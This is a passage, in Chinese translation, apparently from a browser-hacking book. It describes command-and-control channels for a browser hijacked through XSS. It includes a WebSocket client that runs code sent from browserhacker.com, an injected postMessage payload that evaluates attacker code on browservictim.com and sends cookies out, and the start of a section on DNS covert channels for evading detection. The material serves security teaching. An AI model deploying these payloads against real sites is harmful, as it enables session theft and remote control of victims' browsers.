
客户端代码使用原生 WebSocket API 编写。当 WebSocket 通道打开时，客户端会向服务器发送消息，请求更多指令。当服务器回复时，onmessage 事件会被触发，服务器发送的数据会被执行，从而创建一个新的 Function 对象。通过 WebSocket 通道传输的数据可以是 String、Blob 或 ArrayBuffer 类型。在此情况下，类型为 String，这意味着代码需要通过 new Function() 实例化后进行评估。我们假设攻击服务器和发送的 JavaScript 代码是默认受信任的，因此使用 Function 这种方式比使用 eval 更安全。

```
var socket = new WebSocket("ws://browserhacker.com:6666/");
socket.onopen = function(){
  console.log("Socket open.");
  socket.send("Server, send me commands.");
}  
socket.onmessage = function(msg){
  f = new Function(msg.data);
  f();
  console.log("Command received and executed.");
} 
```

如您在 [Figure 3-2](#c03.html#figure3-2) 所见，并非所有浏览器都原生支持 WebSocket API。假设默认使用 XMLHttpRequest 对象作为默认通信通道以支持更多浏览器，但您想将特定通道升级为使用 WebSocket 协议。首先，您需要确定 WebSocket 协议是否受支持。要验证其受支持，需要对浏览器的能力进行指纹识别。关于实现准确且全面的浏览器指纹识别的各种技术在第 6 章的 “Fingerprinting Browsers” 部分有所讨论；不过，您可以通过以下代码检查 WebSocket API 或 Mozilla 的 MozWebSocket 是否受支持：

```
hasWebSocket: function() {
  return !!window.WebSocket || !!window.MozWebSocket;
},
```

如果返回 true，则您可以在 JavaScript 中使用 WebSocket 协议。MozWebSocket 对象与 WebSocket 对象类似，由 Mozilla 在某些较旧的 Firefox 版本（版本 6 到 10）中通过前缀添加。标准 WebSocket 对象在 Firefox 版本 11 及以上无需添加前缀即可使用。

## 使用消息传递通信

如第 1 章所介绍，window.postMessage() 是另一种原生方法，用于实现跨源通信，同时遵守同源策略（SOP）。使用该方法需要进行初始化；首先，您需要在攻击服务器（本例为 browserhacker.com）上托管一个 IFrame 的内容：

```
<html>
<body>
<b>Embed me on a different origin</b>
<div id="debug">Ready to receive data...</div>
 <script>
     window.addEventListener("message", receiveMessage, false);
     function doClick() {
         parent.postMessage("Message sent from " + location.host,
           "http://browservictim.com");
     }
     var debug = document.getElementById("debug");
     function receiveMessage(event) {
         debug.innerHTML += "Data: " + event.data + "\n Origin: " +
          event.origin;
         parent.postMessage("alert(1)", event.origin);
     }
 </script>
</body>
</html>
```

接下来，您需要利用目标站点（假设为 browservictim.com）的 XSS 漏洞进行攻击，注入的 payload 需要包含 JavaScript 逻辑以及 IFrame 本身。创建的 IFrame 加载前面的代码片段。请注意，这里涉及 to_server IFrame 以及 post_msg() 和 receiveMessage() 函数：

```
<div id="debug"> </div>
  <div id="ui">
    <input type="text" id="v" />
    <input type="button" value="Send to server" onclick="post_msg();" />
    <iframe id="to_server"
     src="http://browserhacker.com/postMessage_server.html"></iframe>
   </div>
  <script type="text/javascript">
  window.addEventListener("message", receiveMessage, false);

  var infoBar = document.getElementById("debug");
  function receiveMessage(event) {
    infoBar.innerHTML += event.origin + ": " + event.data + "";
    new Function(event.data)();
  }

  function post_msg(domain) {
        var to_server = document.getElementById("to_server");
        to_server.contentWindow.postMessage("" + 
          eval(document.getElementById("v").value), 
            "http://browserhacker.com");
  }        
  </script>
```

如您在 [Figure 3-3](#c03.html#figure3-3) 所见，browservictim.com 域的 cookie 会被发送到 browserhacker.com，如图 3-3 所示。

 start figure 

[**Figure 3-3:**](#c03.html#figureanchor3-3) Breakpoint on the framed attacker’s code

![c03f003.eps](image_fi/662090c03/c03f003.png)

 end figure 

代码从 browserhacker.com 加载后，会接收来自不同源的数据，并回复额外的 JavaScript 代码，这些代码在 browservictim.com 上通过 new Function 创建后被评估。在前面的代码示例中，发送的简单 alert(1) 如 [Figure 3-4](#c03.html#figure3-4) 所示。

 start figure 

[**Figure 3-4:**](#c03.html#figureanchor3-4) The response is evaluated and the JavaScript is executed

![c03f004.tif](image_fi/662090c03/c03f004.png)

 end figure 

window.postMessage() 可以用于在不同窗口之间（如 IFrames、弹窗、pop‑under、标签页）进行通信。正如预期，各浏览器存在一些 quirks。在 Internet Explorer 8 及以上版本，window.postMessage() 只能用于 IFrames，而不能用于其他标签页或窗口。关于 postMessage() 跨浏览器支持情况的概览，请参见 [Figure 3-5](#c03.html#figure3-5)。

 start figure 

[**Figure 3-5:**](#c03.html#figureanchor3-5) window.postMessage() 支持情况在常见浏览器中的表现

![c03f005.tif](image_fi/662090c03/c03f005.png)

 end figure 

Internet Explorer 版本 8 到 10 只能部分支持 postMessage()，而 WebSocket 协议是完全受支持的（参见注 9）。这也是您可能希望将 postMessage() 设为主要通信通道的原因（前提是被钩浏览器不是 Internet Explorer）。

## 使用 DNS 隧道通信

如前所述，所有讨论过的通信通道均依赖 HTTP 协议。WebSocket 协议是例外，但其初始握手仍然依赖于一个被 HTTP 服务器解释为 Upgrade 请求的 HTTP 请求，例如：

```
GET /ws HTTP/1.1
Host: browserhacker.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: http://browservictim.com
Sec-WebSocket-Version: 13
```

除非您正在针对没有直接连接的浏览器（例如位于 HTTP 代理后面、会记录并可能检查内容的浏览器），否则这里没有问题。这时，基于 DNS 的通信通道可能会派上用场，并结合其他规避技术，以降低被检测的可能性。只有少数安全解决方案监控 DNS 请求，11 而且它们的效果往往受到质疑，因为大多数现代浏览器使用 DNS 预取（DNS prefetching）来提升加载未来资源的响应速度。

Kenton Born 在 2010 年的 BlackHat 会议上发表了研究12，展示了如何利用浏览器自身的 DNS  covert channel。该方法在单向数据从浏览器到服务器的场景下非常有效，但如果通信需要双向进行，则实现会更加复杂。

